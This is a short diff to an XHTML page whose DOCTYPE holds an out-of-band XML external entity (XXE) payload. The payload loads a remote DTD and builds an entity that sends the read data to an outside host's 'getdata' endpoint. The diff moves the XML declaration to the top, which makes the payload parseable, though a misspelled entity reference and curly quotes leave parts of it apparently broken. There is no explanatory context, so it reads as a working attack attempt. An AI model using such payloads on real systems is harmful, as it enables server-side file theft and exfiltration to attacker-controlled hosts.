@@ -1,3 +1,4 @@
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE message [
     <!ENTITY % data SYSTEM “https://mingiiii.github.io/test/test.dtd”>
     <!ENTITY % exploit "<!ENTITY &#x25; external SYSTEM 'http://ssrinctest.run.goorm.io/getdata?data=%data;'>
@@ -5,8 +6,6 @@
     %expoit;
     %external;
 ]>
-
-<?xml version="1.0" encoding="UTF-8"?>
 <?xml-stylesheet href="/css/lofin/layout.css" type="text/css"?>
 <html xmlns="http://www.w3.org/1999/xhtml"
     xmlns:ev="http://www.w3.org/2001/xml-events"
